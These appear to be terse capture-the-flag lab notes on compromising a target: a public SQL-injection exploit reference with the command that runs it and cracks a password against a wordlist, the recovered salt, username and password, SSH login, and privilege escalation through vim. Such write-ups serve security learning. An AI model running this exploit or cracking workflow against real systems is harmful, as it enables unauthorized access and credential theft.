- Searchsploit module: php/webapps/46635.py
- Command to crack password
	`python2 exploit.py -u http://$IP/simple --crack -w /usr/share/seclists/Passwords/Common-Credentials/best110.txt`
- User info
	- salt: 1dac0d92e9fa6bb2
	- username: mitch
	- password: secret
	- email: admin@admin.com
- Logged in with ssh using above credentials
- Used vim to privilege escalate
